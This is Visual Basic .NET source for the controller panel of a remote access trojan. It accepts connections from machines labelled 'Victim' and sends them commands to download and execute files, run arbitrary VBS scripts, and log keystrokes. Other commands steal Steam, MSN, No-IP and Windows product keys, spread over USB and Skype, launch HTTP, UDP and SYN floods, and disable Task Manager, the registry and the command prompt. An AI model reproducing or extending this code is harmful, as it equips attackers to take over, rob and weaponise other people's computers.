Imports System.Net.Sockets
Imports System.Net
Imports System.Threading
Imports System.Management

Public Class Form1

    Public sPath = Application.StartupPath & "/Settings.ini"
    Dim showscreen As String = 0
    Dim listener As TcpListener
    Dim listenerThread As Thread
    Dim port As String = INIRead(sPath, "Settings", "Port")
    Dim online As Integer = 0

    Private Declare Unicode Function WritePrivateProfileString Lib "kernel32" _
  Alias "WritePrivateProfileStringW" (ByVal lpApplicationName As String, _
  ByVal lpKeyName As String, ByVal lpString As String, _
  ByVal lpFileName As String) As Int32


    Private Declare Unicode Function GetPrivateProfileString Lib "kernel32" _
    Alias "GetPrivateProfileStringW" (ByVal lpApplicationName As String, _
    ByVal lpKeyName As String, ByVal lpDefault As String, _
    ByVal lpReturnedString As String, ByVal nSize As Int32, _
    ByVal lpFileName As String) As Int32
    Public Overloads Function INIRead(ByVal INIPath As String, _
    ByVal SectionName As String, ByVal KeyName As String, _
    ByVal DefaultValue As String) As String
        Dim n As Int32
        Dim sData As String
        sData = Space$(1024)
        n = GetPrivateProfileString(SectionName, KeyName, DefaultValue, _
        sData, sData.Length, INIPath)
        If n > 0 Then
            INIRead = sData.Substring(0, n)
        Else
            INIRead = ""
        End If
    End Function
    Public Overloads Function INIRead(ByVal INIPath As String, _
    ByVal SectionName As String, ByVal KeyName As String) As String
        Return INIRead(INIPath, SectionName, KeyName, "")
    End Function
    Public Overloads Function INIRead(ByVal INIPath As String, _
    ByVal SectionName As String) As String
        Return INIRead(INIPath, SectionName, Nothing, "")
    End Function
    Public Overloads Function INIRead(ByVal INIPath As String) As String
        Return INIRead(INIPath, Nothing, Nothing, "")
    End Function
    Public Sub INIWrite(ByVal INIPath As String, ByVal SectionName As String, _
    ByVal KeyName As String, ByVal TheValue As String)
        Call WritePrivateProfileString(SectionName, KeyName, TheValue, INIPath)
    End Sub
    Public Overloads Sub INIDelete(ByVal INIPath As String, ByVal SectionName As String, _
    ByVal KeyName As String)
        Call WritePrivateProfileString(SectionName, KeyName, Nothing, INIPath)
    End Sub
    Public Overloads Sub INIDelete(ByVal INIPath As String, ByVal SectionName As String)
        Call WritePrivateProfileString(SectionName, Nothing, Nothing, INIPath)
    End Sub
    Sub hwid()
        Dim HWID As String = String.Empty
        Dim mc As New ManagementClass("win32_processor")
        Dim moc As ManagementObjectCollection = mc.GetInstances()

        For Each mo As ManagementObject In moc
            If HWID = "" Then
                HWID = mo.Properties("processorID").Value.ToString()
                Exit For
            End If
        Next
        Dim wc As New WebClient
        Dim strings As String
        strings = wc.DownloadString("http://phpbb.voila.net/Data.txt")
        wc.Dispose()

        If strings.Contains(HWID) Then
            MessageBox.Show("HWID", "Bienvenue  !", MessageBoxButtons.OK, MessageBoxIcon.Information)
        Else
            MessageBox.Show("HWID", "Error !", MessageBoxButtons.OK, MessageBoxIcon.Error)
            Me.Close()
        End If
    End Sub
    Public Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        hwid()
        Dim Web As New WebClient
        Label1.Text = port

        If My.Computer.FileSystem.FileExists(Application.StartupPath & "/Settings.ini") Then

        Else
            INIWrite(sPath, "Settings", "Port", "3850")
            INIWrite(sPath, "Settings", "ID", "Victim")

        End If
    End Sub
    Sub Listen()
        listener = New TcpListener(IPAddress.Any, port)
        listener.Start()
        While (True)
            Dim c As New connection(listener.AcceptTcpClient())
            AddHandler c.GotInfo, AddressOf GotInfo
            AddHandler c.Disconnected, AddressOf Disconnected
        End While
    End Sub

    Sub GotInfo(ByVal client As connection, ByVal Msg As String)
        Try

            Dim cut() As String = Msg.Split("|")
            Select Case cut(0)


                Case "SERVER"
                    Invoke(New AddDelegate(AddressOf AddClient), client, New String() {client.IDLog, cut(1), cut(2), cut(3), cut(4), client.IPAddress, cut(5), cut(6)})
                Case "STATUS"
                    Invoke(New UpdateStatusDelegate(AddressOf UpdateStatus), client, cut(1))
            End Select
        Catch ex As Exception
            Console.WriteLine(ex.Message)
        End Try
    End Sub



    Private Sub RemoteDownloadExecuteToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles RemoteDownloadExecuteToolStripMenuItem.Click
        If dl.ShowDialog() = Windows.Forms.DialogResult.OK Then
            SendToSelected("DL|" & dl.URL)
        End If
    End Sub

    Private Sub PwdStripMenuItem2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)
        pw.Show()
    End Sub

    Private Sub MSNStripMenuItem2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)
        msn.Show()
    End Sub

    Private Sub KeyLStripMenuItem2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)
        keylogger.Show()
    End Sub

    Private Sub AboutToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)
        about.Show()
    End Sub

    Private Sub ExitToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ExitToolStripMenuItem.Click
        Me.Close()
    End Sub

    Private Sub BuilderToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles BuilderToolStripMenuItem.Click
        builder.Show()
    End Sub

    Private Sub SettingsToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles SettingsToolStripMenuItem.Click
        settings.Show()
    End Sub

    Private Sub OpenProgramToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles OpenProgramToolStripMenuItem.Click
        If openprog.ShowDialog() = Windows.Forms.DialogResult.OK Then
            SendToSelected("OPENPROGRAM|" & openprog.PROG)
        End If
    End Sub

    Private Sub OpenURLToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles OpenURLToolStripMenuItem.Click
        If openurl.ShowDialog() = Windows.Forms.DialogResult.OK Then
            SendToSelected("OPENURL|" & openurl.URL)
        End If
    End Sub

    Private Sub ListenToolStripMenuItem1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ListenToolStripMenuItem1.Click
        If ToolStripStatusLabel1.Text = ("Status: Listen on " & Label1.Text) Then
            MsgBox("An other session as launched, you can't start new session, please stop the actual session.")
        Else
            listenerThread = New Thread(AddressOf Listen)
            listenerThread.IsBackground = True
            listenerThread.Start()
            ToolStripStatusLabel1.Text = ("Status: Listen on " & Label1.Text)
        End If
    End Sub

    Private Sub StopToolStripMenuItem1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles StopToolStripMenuItem1.Click
        Try
            listenerThread.Abort()
            listener.Stop()
            Cleanup()
            ToolStripStatusLabel1.Text = ("Status: Ready")
            ToolStripStatusLabel3.Text = ("Online: 0")
        Catch ex As Exception

        End Try

    End Sub

    Sub Cleanup()
        lstClients.Items.Clear()
    End Sub


    Delegate Sub AddDelegate(ByVal client As connection, ByVal strings() As String)
    Sub AddClient(ByVal client As connection, ByVal strings() As String)
        Dim l As New ListViewItem(strings)
        l.Tag = client
        online += 1
        ToolStripStatusLabel3.Text = "Online: " & online
        lstClients.Items.Add(l)
        notif.Show()
    End Sub

    Delegate Sub DisconnectedDelegate(ByVal client As connection)
    Sub Disconnected(ByVal client As connection)
        Invoke(New DisconnectedDelegate(AddressOf Remove), client)
    End Sub

    Sub Remove(ByVal client As connection)
        For Each item As ListViewItem In lstClients.Items
            If item.SubItems(5).Text = client.IPAddress Then
                item.Remove()
                online -= 1
                ToolStripStatusLabel3.Text = "Online: " & online
                Exit For
            End If
        Next
    End Sub

    Delegate Sub UpdateStatusDelegate(ByVal client As connection, ByVal Message As String)
    Sub UpdateStatus(ByVal client As connection, ByVal Message As String)
        For Each item As ListViewItem In lstClients.Items
            If item.SubItems(5).Text = client.IPAddress Then
                ToolStripStatusLabel2.Text = Message
            End If
        Next
    End Sub

    Sub SendToAll(ByVal Message As String)
        For Each item As ListViewItem In lstClients.Items
            Try
                Dim c As connection = DirectCast(item.Tag, connection)
                c.Send(Message)
            Catch ex As Exception
                Console.WriteLine(ex.Message)
            End Try
        Next
    End Sub

    Sub SendToSelected(ByVal Message As String)
        For Each item As ListViewItem In lstClients.SelectedItems
            Try
                Dim c As connection = DirectCast(item.Tag, connection)
                c.Send(Message)
            Catch ex As Exception
                Console.WriteLine(ex.Message)
            End Try
        Next
    End Sub

    Private Sub lstClients_SelectedIndexChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles lstClients.SelectedIndexChanged

    End Sub

    Private Sub ToolStripStatusLabel2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ToolStripStatusLabel2.Click

    End Sub

    Private Sub ComputerInfoToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ComputerInfoToolStripMenuItem.Click
        cinfo.Show()
    End Sub

    Private Sub HideShowToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles HideShowToolStripMenuItem.Click

    End Sub

    Private Sub IDToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles IDToolStripMenuItem.Click
        If Me.lstClients.Columns(0).Width = 0 Then
            Me.lstClients.Columns(0).Width = 100
        Else
            Me.lstClients.Columns(0).Width = 0

        End If
    End Sub

    Private Sub PCToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles PCToolStripMenuItem.Click
        If Me.lstClients.Columns(1).Width = 0 Then
            Me.lstClients.Columns(1).Width = 100
        Else
            Me.lstClients.Columns(1).Width = 0

        End If
    End Sub

    Private Sub WinToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles WinToolStripMenuItem.Click
        If Me.lstClients.Columns(2).Width = 0 Then
            Me.lstClients.Columns(2).Width = 100
        Else
            Me.lstClients.Columns(2).Width = 0

        End If
    End Sub

    Private Sub CountryToolStripMenuItem1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CountryToolStripMenuItem1.Click
        If Me.lstClients.Columns(3).Width = 0 Then
            Me.lstClients.Columns(3).Width = 100
        Else
            Me.lstClients.Columns(3).Width = 0

        End If
    End Sub

    Private Sub CPUToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CPUToolStripMenuItem.Click
        If Me.lstClients.Columns(4).Width = 0 Then
            Me.lstClients.Columns(4).Width = 100
        Else
            Me.lstClients.Columns(4).Width = 0

        End If
    End Sub

    Private Sub IPToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles IPToolStripMenuItem.Click
        If Me.lstClients.Columns(5).Width = 0 Then
            Me.lstClients.Columns(5).Width = 100
        Else
            Me.lstClients.Columns(5).Width = 0

        End If
    End Sub

    Private Sub RAMStripMenuItem2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles RAMStripMenuItem2.Click
        If Me.lstClients.Columns(6).Width = 0 Then
            Me.lstClients.Columns(6).Width = 100
        Else
            Me.lstClients.Columns(6).Width = 0

        End If
    End Sub

    Private Sub VersionStripMenuItem2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles VersionStripMenuItem2.Click
        If Me.lstClients.Columns(7).Width = 0 Then
            Me.lstClients.Columns(7).Width = 100
        Else
            Me.lstClients.Columns(7).Width = 0

        End If
    End Sub

    Private Sub RfrshStripMenuItem2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles RfrshStripMenuItem2.Click

    End Sub

    Private Sub DelStripMenuItem2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles DelStripMenuItem2.Click
        lstClients.SelectedItems.Item(0).Remove()
    End Sub

    Private Sub CloseStripMenuItem2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CloseStripMenuItem2.Click
        SendToSelected("CLOSESERVER|")
    End Sub


    Private Sub BlockWebSiteToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles BlockWebSiteToolStripMenuItem.Click
        If blockwebsite.ShowDialog() = Windows.Forms.DialogResult.OK Then
            SendToSelected("BLOCKWEBSITE|" & blockwebsite.URLBlock)
        End If
    End Sub

    Private Sub FakeMessageToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles FakeMessageToolStripMenuItem.Click
        If fakemessage.ShowDialog() = Windows.Forms.DialogResult.OK Then
            SendToSelected("FAKEMSG|" & fakemessage.OptionChecked & "|" & fakemessage.Title & "|" & fakemessage.Message)
        End If
    End Sub

    Private Sub TraceIPToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles TraceIPToolStripMenuItem.Click
        IPTracer.Show()
    End Sub

    Private Sub RestartStripMenuItem2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles RestartStripMenuItem2.Click
        SendToSelected("PCRESTART") ''''''
    End Sub

    Private Sub ShutdownToolStripMenuItem2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ShutdownToolStripMenuItem2.Click
        SendToSelected("PCSHUTDOWN") '''''''
    End Sub

    Private Sub HibernationToolStripMenuItem2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles HibernationToolStripMenuItem2.Click
        SendToSelected("PCLOGOFF") '''''''''''
    End Sub

    Private Sub BSODToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles BSODToolStripMenuItem.Click
        SendToSelected("BSOD") ''''''''''''''
    End Sub

    Private Sub DisableCMDToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles DisableCMDToolStripMenuItem.Click
        SendToSelected("DISABLECMD") ''''''''''''''''''
    End Sub

    Private Sub DisableToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles DisableToolStripMenuItem.Click
        SendToSelected("DISABLETASK") ''''''''''''''''''''
    End Sub

    Private Sub DisableControlPanelToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles DisableControlPanelToolStripMenuItem.Click
        SendToSelected("DISABLECONTROL") '''''''''''
    End Sub

    Private Sub EnableToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles EnableToolStripMenuItem.Click
        SendToSelected("RIGHTCLICKENABLE") '''''''''
    End Sub

    Private Sub DisableToolStripMenuItem1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles DisableToolStripMenuItem1.Click
        SendToSelected("RIGHTCLICKDISABLE") '''''''''''''
    End Sub

    Private Sub EnableToolStripMenuItem1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles EnableToolStripMenuItem1.Click
        SendToSelected("SHOWTASKBAR")  '''''''''''''''''''''''''''''''''''''''''
    End Sub

    Private Sub HideToolStripMenuItem2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles HideToolStripMenuItem2.Click
        SendToSelected("HIDETASKBAR") '''''''''''''''''''''''''''
    End Sub

    Private Sub UsbSpreadToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles UsbSpreadToolStripMenuItem.Click
        SendToSelected("USBSPREAD") '''''''''''''''''''''''''''''''''''
    End Sub

    Private Sub OpenDVDToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles OpenDVDToolStripMenuItem.Click
        SendToSelected("OpenDVD") '''''''''''''''''''''''''''''''''''''''''''''
    End Sub

    Private Sub CloseDVDToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CloseDVDToolStripMenuItem.Click
        SendToSelected("CloseDVD") '''''''''''''''''''''''''''''''''''''''''''''''
    End Sub

    Private Sub DisableRegistreToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles DisableRegistreToolStripMenuItem.Click
        SendToSelected("DisableRegistre") ''''''''''''''''''''''
    End Sub

    Private Sub TurnOnToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles TurnOnToolStripMenuItem.Click
        SendToSelected("MTON") '''''''''''''''''''''''''''''''''''''''''
    End Sub

    Private Sub TurnOffToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles TurnOffToolStripMenuItem.Click
        SendToSelected("MTOFF") ''''''''''''''''''''''''''''''''''''''
    End Sub

    Private Sub UpdateToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)
        Dim webu As New WebClient
        Dim CheckUpdate As String
        Dim aPath As String = Application.StartupPath()
        CheckUpdate = webu.DownloadString("http://madproject.tonsite.biz/tdeupdatepriv/update.txt")
        If CheckUpdate.Contains(Application.ProductVersion) Then
            MsgBox("No update available.")
            webu.Dispose()
        Else
            Dim URL As String = webu.DownloadString("http://madproject.tonsite.biz/tdeupdatepriv/updatelink.txt")
            My.Computer.Network.DownloadFile(URL, aPath & "\Update" & "\" & webu.DownloadString("http://madproject.tonsite.biz/tdeupdatepriv/updatepath.txt") & ".rar")
            MsgBox("Updated succefully, check in your folder.")
        End If
    End Sub

    Private Sub ChangeBackgroundToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ChangeBackgroundToolStripMenuItem.Click
        If background.ShowDialog() = Windows.Forms.DialogResult.OK Then
            SendToSelected("CHANGEBACKGROUND|" & background.backgroundl)
        End If
    End Sub



    Private Sub MuteToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MuteToolStripMenuItem.Click
        SendToSelected("MUTESOUND")
    End Sub

    Private Sub CrasyDVDToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CrasyDVDToolStripMenuItem.Click
        SendToSelected("CrasyDVD")
    End Sub

    Private Sub SpeakToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles SpeakToolStripMenuItem.Click
        If Speak.ShowDialog() = Windows.Forms.DialogResult.OK Then
            SendToSelected("SPEAK|" & Speak.SPEAK)
        End If
    End Sub

    Private Sub HideToolStripMenuItem3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)
        SendToSelected("HIDEBUTTON")
    End Sub

    Private Sub EnabledToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles EnabledToolStripMenuItem.Click
        SendToSelected("EnableKey/Mouse")
    End Sub

    Private Sub DisabledToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles DisabledToolStripMenuItem.Click
        SendToSelected("DisableKey/Mouse")
    End Sub


    Private Sub CloseProcessusToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CloseProcessusToolStripMenuItem.Click
        If closeprocess.ShowDialog() = Windows.Forms.DialogResult.OK Then
            SendToSelected("CLOSEPROCESS|" & closeprocess.closeprocess)
        End If

    End Sub

    Private Sub StartProcessToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles StartProcessToolStripMenuItem.Click
        If startprocess.ShowDialog() = Windows.Forms.DialogResult.OK Then
            SendToSelected("STARTPROCESS|" & startprocess.startprocess)
        End If
    End Sub



    Private Sub ChangeHomePageToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ChangeHomePageToolStripMenuItem.Click
        If changehomepage.ShowDialog() = Windows.Forms.DialogResult.OK Then
            SendToSelected("CHANGEHP|" & changehomepage.changehomepage)
        End If
    End Sub

    Private Sub SkypeSpreadToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles SkypeSpreadToolStripMenuItem.Click
        If skypespread.ShowDialog() = Windows.Forms.DialogResult.OK Then
            SendToSelected("SKYPESPREAD|" & skypespread.skypespread)
        End If
    End Sub

    Private Sub HttpFloodToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)

    End Sub

    Private Sub StartToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)
    
    End Sub

    Private Sub StopToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)
        SendToSelected("SHTTP")
    End Sub

    Private Sub NoIpUpdateToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles NoIpUpdateToolStripMenuItem.Click
        noip.Show()
    End Sub

    Private Sub WindowsKeyToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)
        SendToSelected("WINKEY")
    End Sub

    Private Sub WindowsKeyToolStripMenuItem_Click_1(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles WindowsKeyToolStripMenuItem.Click
        SendToSelected("WINKEY")
    End Sub


    Private Sub FpscKeyToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles FpscKeyToolStripMenuItem.Click
        SendToSelected("FPSC")
    End Sub

    Private Sub ExitToolStripMenuItem1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ExitToolStripMenuItem1.Click
        Me.Close()
    End Sub

    Private Sub HideToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles HideToolStripMenuItem.Click
        ShowIcon = False
        ShowInTaskbar = False
        Me.Hide()
    End Sub


  
    Private Sub ShowToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ShowToolStripMenuItem.Click
        ShowIcon = True
        ShowInTaskbar = True
        Me.Show()
    End Sub




    Private Sub HttpFloodToolStripMenuItem1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)

    End Sub

    Private Sub StopToolStripMenuItem_Click_1(ByVal sender As System.Object, ByVal e As System.EventArgs)
        SendToSelected("SHTTP")
    End Sub

    Private Sub ScreenCaptureToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)
        SendToSelected("CAPTURE")
    End Sub

    Private Sub StatisticsToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)

    End Sub

    Private Sub RunHtmlScriptToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles RunHtmlScriptToolStripMenuItem.Click
        If Html.ShowDialog() = Windows.Forms.DialogResult.OK Then
            SendToSelected("HTML|" & Html.html)
        End If
    End Sub


    Private Sub RunVbsScriptToolStripMenuItem1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles RunVbsScriptToolStripMenuItem1.Click
        If vbs.ShowDialog() = Windows.Forms.DialogResult.OK Then
            SendToSelected("VBS|" & vbs.vbs)
        End If
    End Sub

    Private Sub CleanScriptToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CleanScriptToolStripMenuItem.Click
        SendToSelected("CLEANS")
    End Sub

    Private Sub ViewProcessToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)
        SendToSelected("VPROCESS")
    End Sub

    Private Sub StartFloodToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles StartFloodToolStripMenuItem.Click
        If httpf.ShowDialog() = Windows.Forms.DialogResult.OK Then
            SendToSelected("HTTPF|" & httpf.httpf)
        End If
    End Sub

    Private Sub CloseToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CloseToolStripMenuItem.Click
        SendToSelected("HTTPS")
    End Sub

    Private Sub StopToolStripMenuItem_Click_2(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles StopToolStripMenuItem.Click
        SendToSelected("SUDP")
        SendToSelected("RESTART")
    End Sub

    Private Sub StartToolStripMenuItem_Click_1(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles StartToolStripMenuItem.Click
        If udp.ShowDialog() = Windows.Forms.DialogResult.OK Then
            SendToSelected("UDP|" & udp.udp)
        End If
    End Sub

    Private Sub IPGraberToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles IPGraberToolStripMenuItem.Click
        IP_Grabber.Show()
    End Sub

    Private Sub StopToolStripMenuItem2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles StopToolStripMenuItem2.Click
        SendToSelected("SSYN")
    End Sub

    Private Sub StartToolStripMenuItem1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles StartToolStripMenuItem1.Click
        If Syn.ShowDialog() = Windows.Forms.DialogResult.OK Then
            SendToSelected("SYN|" & Syn.syn)
        End If
    End Sub

    Private Sub ExitToolStripMenuItem2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ExitToolStripMenuItem2.Click
        Me.Close()
    End Sub

    Private Sub GetAntivirusToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles GetAntivirusToolStripMenuItem.Click
        SendToSelected("GETAV")
    End Sub

    Private Sub SteamToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles SteamToolStripMenuItem.Click
        SendToSelected("Steam")
    End Sub

    Private Sub StealAllToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles StealAllToolStripMenuItem.Click
        SendToSelected("Steam")
        SendToSelected("FPSC")
        SendToSelected("WINKEY")
        SendToSelected("NOIPSTEAL")
        SendToSelected("Msn")
        SendToSelected("STEALALL")
    End Sub

    Private Sub StartToolStripMenuItem2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles StartToolStripMenuItem2.Click
        If udp.ShowDialog() = Windows.Forms.DialogResult.OK Then
            SendToSelected("GUDP|" & udp.udp)
        End If
    End Sub

    Private Sub PortToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles PortToolStripMenuItem.Click
        If gport.ShowDialog() = Windows.Forms.DialogResult.OK Then
            SendToSelected("gport|" & gport.gport)
        End If
    End Sub

    Private Sub StopToolStripMenuItem3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles StopToolStripMenuItem3.Click
        SendToSelected("SUDP")
        SendToSelected("RESTART")
    End Sub

    Private Sub HideToolStripMenuItem1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles HideToolStripMenuItem1.Click
        SendToSelected("HCURSOR")
    End Sub

    Private Sub ShowToolStripMenuItem1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ShowToolStripMenuItem1.Click
        SendToSelected("SCURSOR")
    End Sub

    Private Sub NoIpToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles NoIpToolStripMenuItem.Click
        SendToSelected("NOIPSTEAL")
    End Sub

    Private Sub MsnToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MsnToolStripMenuItem.Click
        SendToSelected("Msn")
    End Sub
End Class
